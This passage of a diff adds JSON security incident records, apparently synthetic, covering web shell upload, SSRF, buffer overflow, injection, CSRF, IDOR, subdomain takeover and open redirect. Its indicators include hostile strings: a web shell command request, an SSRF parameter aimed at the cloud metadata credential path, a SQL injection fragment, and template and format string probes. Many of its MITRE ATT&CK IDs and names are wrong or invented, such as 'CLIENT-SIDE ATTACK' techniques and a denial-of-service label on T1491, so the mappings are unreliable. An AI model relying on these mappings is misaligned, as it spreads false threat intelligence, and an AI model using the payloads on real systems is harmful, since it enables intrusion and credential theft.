+        "installed_software": [
+          {
+            "name": "Apache HTTP Server",
+            "version": "2.4.41"
+          },
+          {
+            "name": "PHP",
+            "version": "7.4.3"
+          }
+        ],
+        "role": "Internal Service"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1609",
+        "name": "Container Administration Command"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1505.003",
+        "name": "Server Software: Web Shell"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "file_extension",
+        "value": ".php",
+        "context": "Suspicious uploaded file extension"
+      },
+      {
+        "type": "http_request_pattern",
+        "value": "GET /uploads/shell.php?cmd=whoami",
+        "context": "Execution attempt"
+      }
+    ],
+    "initial_findings": "Remote code execution via unrestricted file upload vulnerability."
+  },
+  {
+    "incident_id": "INC-2023-08-09-027",
+    "timestamp": "2023-08-09T14:30:00Z",
+    "title": "SSRF to Access Cloud Metadata",
+    "description": "Logs show attempts to leverage a public-facing service to access cloud instance metadata.",
+    "affected_assets": [
+      {
+        "hostname": "pdf-renderer-service",
+        "ip_address": "203.0.113.80",
+        "os": "Amazon Linux 2",
+        "installed_software": [
+          {
+            "name": "Python",
+            "version": "3.8.8"
+          },
+          {
+            "name": "reportlab",
+            "version": "3.5.68"
+          }
+        ],
+        "role": "Public-Facing Service"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T0918",
+        "name": "Server-Side Request Forgery"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1592.004",
+        "name": "Gather Victim Host Information: File Contents"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "http_request_parameter",
+        "value": "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role",
+        "context": "Observed request parameter"
+      },
+      {
+        "type": "application_log_pattern",
+        "value": "Attempted access to internal IP 169.254.169.254",
+        "context": "Observed log pattern"
+      }
+    ],
+    "initial_findings": "Attempted SSRF to access cloud metadata service."
+  },
+  {
+    "incident_id": "INC-2023-08-10-028",
+    "timestamp": "2023-08-10T09:00:00Z",
+    "title": "Buffer Overflow Attempt",
+    "description": "Application crashed with errors indicating a potential buffer overflow condition triggered by malformed input.",
+    "affected_assets": [
+      {
+        "hostname": "legacy-service-01",
+        "ip_address": "192.168.1.120",
+        "os": "CentOS 6",
+        "installed_software": [
+          {
+            "name": "Custom C++ Application",
+            "version": "1.0"
+          }
+        ],
+        "role": "Legacy Service"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1491",
+        "name": "Denial of Service: Resource Exhaustion"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "application_crash_log",
+        "value": "Segmentation fault",
+        "context": "Observed crash log"
+      },
+      {
+        "type": "input_data_pattern",
+        "value": "long string of A's",
+        "context": "Malformed input pattern"
+      }
+    ],
+    "initial_findings": "Buffer overflow vulnerability likely attempted, causing denial of service."
+  },
+  {
+    "incident_id": "INC-2023-08-10-029",
+    "timestamp": "2023-08-10T11:30:00Z",
+    "title": "Use After Free Vulnerability Exploited",
+    "description": "Security monitoring detected unusual memory access patterns and application instability consistent with a use-after-free exploit.",
+    "affected_assets": [
+      {
+        "hostname": "media-processing-service",
+        "ip_address": "10.10.5.70",
+        "os": "Ubuntu 20.04 LTS",
+        "installed_software": [
+          {
+            "name": "FFmpeg",
+            "version": "4.2.7"
+          }
+        ],
+        "role": "Internal Service"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1053",
+        "name": "Scheduled Task/Job"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "memory_access_pattern",
+        "value": "access to freed memory region",
+        "context": "Observed pattern"
+      },
+      {
+        "type": "process_behavior",
+        "value": "unusual child process spawned",
+        "context": "Anomalous process behavior"
+      }
+    ],
+    "initial_findings": "Use-after-free vulnerability potentially exploited in media processing service."
+  },
+  {
+    "incident_id": "INC-2023-08-10-030",
+    "timestamp": "2023-08-10T14:00:00Z",
+    "title": "Integer Overflow Vulnerability Attempt",
+    "description": "Application logs show unexpected behavior and calculations resulting from large input values, indicative of an integer overflow attempt.",
+    "affected_assets": [
+      {
+        "hostname": "financial-calculator-service",
+        "ip_address": "192.168.1.130",
+        "os": "CentOS 7",
+        "installed_software": [
+          {
+            "name": "Custom Java Application",
+            "version": "2.0"
+          }
+        ],
+        "role": "Internal Service"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1484",
+        "name": "Domain Policy Modification"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "application_log_pattern",
+        "value": "Integer overflow detected",
+        "context": "Observed log pattern"
+      },
+      {
+        "type": "input_data_pattern",
+        "value": "very large numerical input",
+        "context": "Malformed input pattern"
+      }
+    ],
+    "initial_findings": "Integer overflow vulnerability likely attempted."
+  },
+  {
+    "incident_id": "INC-2023-08-11-031",
+    "timestamp": "2023-08-11T09:30:00Z",
+    "title": "Race Condition Vulnerability Exploited",
+    "description": "Logs show a sequence of events occurring in an unexpected order, leading to unauthorized state change, consistent with a race condition exploit.",
+    "affected_assets": [
+      {
+        "hostname": "transaction-service-03",
+        "ip_address": "10.10.5.80",
+        "os": "Ubuntu 20.04 LTS",
+        "installed_software": [
+          {
+            "name": "Node.js",
+            "version": "16.14.0"
+          }
+        ],
+        "role": "Internal Service"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1068",
+        "name": "Exploitation for Privilege Escalation"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "application_log_pattern",
+        "value": "Unexpected state transition",
+        "context": "Observed log pattern"
+      },
+      {
+        "type": "timing_anomaly",
+        "value": "operations completed out of expected order",
+        "context": "Observed anomaly"
+      }
+    ],
+    "initial_findings": "Race condition vulnerability potentially exploited in transaction service."
+  },
+  {
+    "incident_id": "INC-2023-08-11-032",
+    "timestamp": "2023-08-11T11:00:00Z",
+    "title": "Format String Vulnerability Attempt",
+    "description": "Application logs show errors and unusual output when processing input containing format string specifiers.",
+    "affected_assets": [
+      {
+        "hostname": "logging-service-05",
+        "ip_address": "192.168.1.140",
+        "os": "CentOS 7",
+        "installed_software": [
+          {
+            "name": "Custom C Application",
+            "version": "1.0"
+          }
+        ],
+        "role": "Internal Service"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "application_log_pattern",
+        "value": "Segmentation fault or unusual output",
+        "context": "Observed log pattern"
+      },
+      {
+        "type": "input_data_pattern",
+        "value": "%x%x%x%x",
+        "context": "Malformed input pattern"
+      }
+    ],
+    "initial_findings": "Format string vulnerability likely attempted."
+  },
+  {
+    "incident_id": "INC-2023-08-11-033",
+    "timestamp": "2023-08-11T14:30:00Z",
+    "title": "Cross-Site Request Forgery (CSRF) Attempt",
+    "description": "Web application logs show requests originating from unexpected sources with valid user sessions, consistent with a CSRF attempt.",
+    "affected_assets": [
+      {
+        "hostname": "user-portal-prod",
+        "ip_address": "203.0.113.90",
+        "os": "Ubuntu 22.04 LTS",
+        "installed_software": [
+          {
+            "name": "Django",
+            "version": "4.0.3"
+          },
+          {
+            "name": "Nginx",
+            "version": "1.18.0"
+          }
+        ],
+        "role": "Public-Facing User Portal"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T0863",
+        "name": "CLIENT-SIDE ATTACK: Cross-Site Request Forgery"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "http_request_header",
+        "value": "Referer: malicious.site",
+        "context": "Suspicious Referer header"
+      },
+      {
+        "type": "http_request_pattern",
+        "value": "POST /user/change_password",
+        "context": "Sensitive action request"
+      }
+    ],
+    "initial_findings": "CSRF vulnerability likely attempted against user portal."
+  },
+  {
+    "incident_id": "INC-2023-08-12-034",
+    "timestamp": "2023-08-12T09:00:00Z",
+    "title": "SQL Injection via Second-Order Injection",
+    "description": "Application logs show unusual database errors triggered by data previously submitted by a user, indicating second-order SQL injection.",
+    "affected_assets": [
+      {
+        "hostname": "data-processing-service",
+        "ip_address": "10.10.5.90",
+        "os": "CentOS 7",
+        "installed_software": [
+          {
+            "name": "Python",
+            "version": "3.6.8"
+          },
+          {
+            "name": "SQLAlchemy",
+            "version": "1.4.20"
+          }
+        ],
+        "role": "Internal Service"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1059.004",
+        "name": "Command and Scripting Interpreter: SQL"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "application_log_pattern",
+        "value": "SQL error near 'OR '1'='1",
+        "context": "Observed SQL error"
+      },
+      {
+        "type": "user_input_history",
+        "value": "previously submitted malicious string",
+        "context": "Related user input"
+      }
+    ],
+    "initial_findings": "Second-order SQL injection vulnerability potentially exploited."
+  },
+  {
+    "incident_id": "INC-2023-08-12-035",
+    "timestamp": "2023-08-12T11:30:00Z",
+    "title": "Server-Side Template Injection Attempt",
+    "description": "Web application logs show attempts to inject template syntax into user-controlled input fields.",
+    "affected_assets": [
+      {
+        "hostname": "template-rendering-service",
+        "ip_address": "192.168.1.150",
+        "os": "Ubuntu 20.04 LTS",
+        "installed_software": [
+          {
+            "name": "Jinja2",
+            "version": "2.11.3"
+          }
+        ],
+        "role": "Internal Service"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "http_request_parameter",
+        "value": "template={{7*7}}",
+        "context": "Observed request parameter"
+      },
+      {
+        "type": "application_log_pattern",
+        "value": "TemplateSyntaxError",
+        "context": "Observed log pattern"
+      }
+    ],
+    "initial_findings": "Server-Side Template Injection vulnerability likely attempted."
+  },
+  {
+    "incident_id": "INC-2023-08-12-036",
+    "timestamp": "2023-08-12T14:00:00Z",
+    "title": "Insecure Direct Object Reference (IDOR) Detected",
+    "description": "User accessed data belonging to another user by changing an ID parameter in a URL.",
+    "affected_assets": [
+      {
+        "hostname": "user-data-api",
+        "ip_address": "10.10.5.100",
+        "os": "CentOS 7",
+        "installed_software": [
+          {
+            "name": "Node.js",
+            "version": "16.14.0"
+          }
+        ],
+        "role": "Internal API"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T0868",
+        "name": "CLIENT-SIDE ATTACK: Insecure Direct Object Reference"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "http_request_pattern",
+        "value": "GET /api/v1/users/other_user_id",
+        "context": "Observed request pattern"
+      },
+      {
+        "type": "authentication_log",
+        "value": "user accessed data for different user ID",
+        "context": "Observed log"
+      }
+    ],
+    "initial_findings": "IDOR vulnerability detected in user data API."
+  },
+  {
+    "incident_id": "INC-2023-08-13-037",
+    "timestamp": "2023-08-13T09:30:00Z",
+    "title": "Cross-Origin Resource Sharing (CORS) Misconfiguration",
+    "description": "Browser security alerts indicate a web application is allowing cross-origin requests from unexpected domains.",
+    "affected_assets": [
+      {
+        "hostname": "web-app-prod-05",
+        "ip_address": "203.0.113.100",
+        "os": "Ubuntu 22.04 LTS",
+        "installed_software": [
+          {
+            "name": "Apache HTTP Server",
+            "version": "2.4.52"
+          }
+        ],
+        "role": "Public Web Application"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T0862",
+        "name": "CLIENT-SIDE ATTACK: Cross-Origin Resource Sharing"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "browser_console_error",
+        "value": "CORS policy: No 'Access-Control-Allow-Origin' header is present",
+        "context": "Observed browser error"
+      },
+      {
+        "type": "http_response_header",
+        "value": "Access-Control-Allow-Origin: *",
+        "context": "Observed response header"
+      }
+    ],
+    "initial_findings": "CORS misconfiguration on public web application."
+  },
+  {
+    "incident_id": "INC-2023-08-13-038",
+    "timestamp": "2023-08-13T11:00:00Z",
+    "title": "Subdomain Takeover Attempt",
+    "description": "Threat intelligence alert indicates a dangling DNS record pointing to a service that is no longer active, potentially allowing subdomain takeover.",
+    "affected_assets": [
+      {
+        "hostname": "old-blog.example.com",
+        "ip_address": "N/A",
+        "os": "N/A",
+        "installed_software": [],
+        "role": "Legacy DNS Entry"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1584",
+        "name": "Compromise Infrastructure"
+      },
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T1584.001",
+        "name": "Compromise Infrastructure: DNS"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "dns_record",
+        "value": "CNAME old-blog.example.com -> inactive-service.cloudprovider.com",
+        "context": "Observed DNS record"
+      },
+      {
+        "type": "threat_intel_alert",
+        "value": "Dangling DNS record detected",
+        "context": "Threat intel alert"
+      }
+    ],
+    "initial_findings": "Potential subdomain takeover risk due to dangling DNS record."
+  },
+  {
+    "incident_id": "INC-2023-08-13-039",
+    "timestamp": "2023-08-13T14:30:00Z",
+    "title": "Open Redirect Vulnerability Exploited",
+    "description": "Security logs show users being redirected to external, potentially malicious websites via a trusted internal URL.",
+    "affected_assets": [
+      {
+        "hostname": "url-shortener-service",
+        "ip_address": "192.168.1.160",
+        "os": "Ubuntu 20.04 LTS",
+        "installed_software": [
+          {
+            "name": "Node.js",
+            "version": "14.17.0"
+          }
+        ],
+        "role": "Internal Service"
+      }
+    ],
+    "observed_ttps": [
+      {
+        "framework": "MITRE ATT&CK",
+        "id": "T0864",
+        "name": "CLIENT-SIDE ATTACK: Open Redirect"
+      }
+    ],
+    "indicators_of_compromise": [
+      {
+        "type": "http_request_parameter",
+        "value": "redirect_url=http://malicious.site",
+        "context": "Observed request parameter"
+      },
+      {
+        "type": "user_behavior",
+        "value": "clicked link leading to external site",
+        "context": "Observed user action"
+      }
+    ],
+    "initial_findings": "Open redirect vulnerability exploited in URL shortener service."
+  }
+]
